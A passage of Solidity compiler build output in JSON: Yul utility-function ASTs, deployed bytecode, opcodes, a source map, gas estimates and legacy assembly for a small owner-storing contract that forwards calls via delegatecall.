																	"src": "462:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "start",
																		"nodeType": "YulIdentifier",
																		"src": "604:5:1"
																	},
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "611:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "616:6:1"
																	}
																],
																"functionName": {
																	"name": "copy_calldata_to_memory_with_cleanup",
																	"nodeType": "YulIdentifier",
																	"src": "567:36:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "567:56:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "567:56:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "632:23:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "643:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "648:6:1"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "639:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "639:16:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "632:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_bytes_calldata_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "start",
														"nodeType": "YulTypedName",
														"src": "425:5:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "432:6:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "440:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "448:3:1",
														"type": ""
													}
												],
												"src": "334:327:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "811:147:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "822:110:1",
															"value": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "911:6:1"
																	},
																	{
																		"name": "value1",
																		"nodeType": "YulIdentifier",
																		"src": "919:6:1"
																	},
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "928:3:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bytes_calldata_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "829:81:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "829:103:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "822:3:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "942:10:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "949:3:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "942:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_packed_t_bytes_calldata_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "782:3:1",
														"type": ""
													},
													{
														"name": "value1",
														"nodeType": "YulTypedName",
														"src": "788:6:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "796:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "807:3:1",
														"type": ""
													}
												],
												"src": "667:291:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1009:81:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1019:65:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1034:5:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1041:42:1",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "and",
																	"nodeType": "YulIdentifier",
																	"src": "1030:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1030:54:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1019:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint160",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "991:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1001:7:1",
														"type": ""
													}
												],
												"src": "964:126:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1141:51:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1151:35:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1180:5:1"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint160",
																	"nodeType": "YulIdentifier",
																	"src": "1162:17:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1162:24:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "1151:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_address",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1123:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "1133:7:1",
														"type": ""
													}
												],
												"src": "1096:96:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1263:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1280:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1303:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_address",
																			"nodeType": "YulIdentifier",
																			"src": "1285:17:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1285:24:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1273:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1273:37:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1273:37:1"
														}
													]
												},
												"name": "abi_encode_t_address_to_t_address_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1251:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1258:3:1",
														"type": ""
													}
												],
												"src": "1198:118:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1420:124:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1430:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "1442:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1453:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1438:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1438:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "1430:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1510:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "1523:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1534:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1519:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1519:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_address_to_t_address_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1466:43:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1466:71:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1466:71:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_address__to_t_address__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "1392:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1404:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1415:4:1",
														"type": ""
													}
												],
												"src": "1322:222:1"
											}
										]
									},
									"contents": "{\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {\n        updated_pos := pos\n    }\n\n    function copy_calldata_to_memory_with_cleanup(src, dst, length) {\n        calldatacopy(dst, src, length)\n        mstore(add(dst, length), 0)\n    }\n\n    // bytes -> bytes\n    function abi_encode_t_bytes_calldata_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(start, length, pos) -> end {\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length)\n\n        copy_calldata_to_memory_with_cleanup(start, pos, length)\n        end := add(pos, length)\n    }\n\n    function abi_encode_tuple_packed_t_bytes_calldata_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed(pos , value1, value0) -> end {\n\n        pos := abi_encode_t_bytes_calldata_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(value0, value1,  pos)\n\n        end := pos\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_tuple_t_address__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b506004361061002f5760003560e01c80638da5cb5b146100be57610030565b5b6000600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1660003660405161007c92919061013f565b600060405180830381855af49150503d80600081146100b7576040519150601f19603f3d011682016040523d82523d6000602084013e6100bc565b606091505b005b6100c66100dc565b6040516100d39190610199565b60405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600081905092915050565b82818337600083830152505050565b60006101268385610100565b935061013383858461010b565b82840190509392505050565b600061014c82848661011a565b91508190509392505050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061018382610158565b9050919050565b61019381610178565b82525050565b60006020820190506101ae600083018461018a565b9291505056fea2646970667358221220976c2cd3ca30ab452c5f67efaa7af1159490664a92dc9a7cf70a4a335e94608564736f6c63430008110033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x2F JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x8DA5CB5B EQ PUSH2 0xBE JUMPI PUSH2 0x30 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x0 CALLDATASIZE PUSH1 0x40 MLOAD PUSH2 0x7C SWAP3 SWAP2 SWAP1 PUSH2 0x13F JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 GAS DELEGATECALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0xB7 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0xBC JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST STOP JUMPDEST PUSH2 0xC6 PUSH2 0xDC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xD3 SWAP2 SWAP1 PUSH2 0x199 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 DUP2 DUP4 CALLDATACOPY PUSH1 0x0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x126 DUP4 DUP6 PUSH2 0x100 JUMP JUMPDEST SWAP4 POP PUSH2 0x133 DUP4 DUP6 DUP5 PUSH2 0x10B JUMP JUMPDEST DUP3 DUP5 ADD SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x14C DUP3 DUP5 DUP7 PUSH2 0x11A JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x183 DUP3 PUSH2 0x158 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x193 DUP2 PUSH2 0x178 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1AE PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x18A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP8 PUSH13 0x2CD3CA30AB452C5F67EFAA7AF1 ISZERO SWAP5 SWAP1 PUSH7 0x4A92DC9A7CF70A 0x4A CALLER 0x5E SWAP5 PUSH1 0x85 PUSH5 0x736F6C6343 STOP ADDMOD GT STOP CALLER ",
							"sourceMap": "233:327:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;456:11;480:8;;;;;;;;;;;472:30;;503:8;;472:40;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;260:20;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;:::o;7:147:1:-;108:11;145:3;130:18;;7:147;;;;:::o;160:146::-;257:6;252:3;247;234:30;298:1;289:6;284:3;280:16;273:27;160:146;;;:::o;334:327::-;448:3;469:88;550:6;545:3;469:88;:::i;:::-;462:95;;567:56;616:6;611:3;604:5;567:56;:::i;:::-;648:6;643:3;639:16;632:23;;334:327;;;;;:::o;667:291::-;807:3;829:103;928:3;919:6;911;829:103;:::i;:::-;822:110;;949:3;942:10;;667:291;;;;;:::o;964:126::-;1001:7;1041:42;1034:5;1030:54;1019:65;;964:126;;;:::o;1096:96::-;1133:7;1162:24;1180:5;1162:24;:::i;:::-;1151:35;;1096:96;;;:::o;1198:118::-;1285:24;1303:5;1285:24;:::i;:::-;1280:3;1273:37;1198:118;;:::o;1322:222::-;1415:4;1453:2;1442:9;1438:18;1430:26;;1466:71;1534:1;1523:9;1519:17;1510:6;1466:71;:::i;:::-;1322:222;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "98000",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"": "infinite",
								"owner()": "2489"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 233,
									"end": 560,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 233,
									"end": 560,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 233,
									"end": 560,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 309,
									"end": 422,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 309,
									"end": 422,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 309,
									"end": 422,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 309,
									"end": 422,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 309,
									"end": 422,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 309,
									"end": 422,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "3"
								},
								{
									"begin": 309,
									"end": 422,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "tag",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 309,
									"end": 422,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 374,
									"end": 390,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 354,
									"end": 362,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 354,
									"end": 362,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 354,
									"end": 391,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 354,
									"end": 391,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 354,
									"end": 391,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 354,
									"end": 391,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 354,
									"end": 391,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 354,
									"end": 391,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 354,
									"end": 391,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 354,
									"end": 391,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 354,
									"end": 391,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 354,
									"end": 391,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 354,
									"end": 391,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 354,
									"end": 391,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 354,
									"end": 391,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 354,
									"end": 391,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 354,
									"end": 391,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 354,
									"end": 391,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 354,
									"end": 391,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 354,
									"end": 391,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 406,
									"end": 416,
									"name": "CALLER",
									"source": 0
								},
								{
									"begin": 398,
									"end": 403,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 398,
									"end": 403,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 398,
									"end": 416,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 398,
									"end": 416,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 398,
									"end": 416,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 398,
									"end": 416,
									"name": "SLOAD",
									"source": 0
								},
								{
									"begin": 398,
									"end": 416,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 398,
									"end": 416,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 398,
									"end": 416,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 398,
									"end": 416,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 398,
									"end": 416,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 398,
									"end": 416,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 398,
									"end": 416,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 398,
									"end": 416,
									"name": "PUSH",
									"source": 0,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 398,
									"end": 416,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 398,
									"end": 416,
									"name": "MUL",
									"source": 0
								},
								{
									"begin": 398,
									"end": 416,
									"name": "OR",
									"source": 0
								},
								{
									"begin": 398,
									"end": 416,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 398,
									"end": 416,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 398,
									"end": 416,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 309,
									"end": 422,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 233,
									"end": 560,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "6"
								},
								{
									"begin": 233,
									"end": 560,
									"name": "JUMP",
									"source": 0
								},
								{
									"begin": 88,
									"end": 205,
									"name": "tag",
									"source": 1,
									"value": "8"
								},
								{
									"begin": 88,
									"end": 205,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 197,
									"end": 198,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 194,
									"end": 195,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 187,
									"end": 199,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "tag",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 334,
									"end": 460,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 371,
									"end": 378,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 411,
									"end": 453,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 404,
									"end": 409,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 400,
									"end": 454,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 389,
									"end": 454,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 389,
									"end": 454,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 334,
									"end": 460,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "tag",
									"source": 1,
									"value": "11"
								},
								{
									"begin": 466,
									"end": 562,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 503,
									"end": 510,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 550,
									"end": 555,
									"name": "DUP3",
									"source": 1
								},
								{
									"begin": 532,
									"end": 556,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "10"
								},
								{
									"begin": 532,
									"end": 556,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 532,
									"end": 556,
									"name": "tag",
									"source": 1,
									"value": "20"
								},
								{
									"begin": 532,
									"end": 556,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 521,
									"end": 556,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 521,
									"end": 556,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 466,
									"end": 562,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"name": "tag",
									"source": 1,
									"value": "12"
								},
								{
									"begin": 568,
									"end": 690,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "22"
								},
								{
									"begin": 659,
									"end": 664,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "11"
								},
								{
									"begin": 641,
									"end": 665,
									"jumpType": "[in]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 641,
									"end": 665,
									"name": "tag",
									"source": 1,
									"value": "22"
								},
								{
									"begin": 641,
									"end": 665,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 634,
									"end": 639,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 631,
									"end": 666,
									"name": "EQ",
									"source": 1
								},
								{
									"begin": 621,
									"end": 684,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "23"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 680,
									"end": 681,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 677,
									"end": 678,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 670,
									"end": 682,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 621,
									"end": 684,
									"name": "tag",
									"source": 1,
									"value": "23"
								},
								{
									"begin": 621,
									"end": 684,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 568,
									"end": 690,
									"jumpType": "[out]",
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 696,
									"end": 839,
									"name": "tag",
									"source": 1,
									"value": "13"
								},
								{
									"begin": 696,
									"end": 839,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 753,
									"end": 758,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 784,
									"end": 790,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 778,
									"end": 791,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 769,
									"end": 791,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 769,
									"end": 791,
									"name": "POP",
									"source": 1
								},
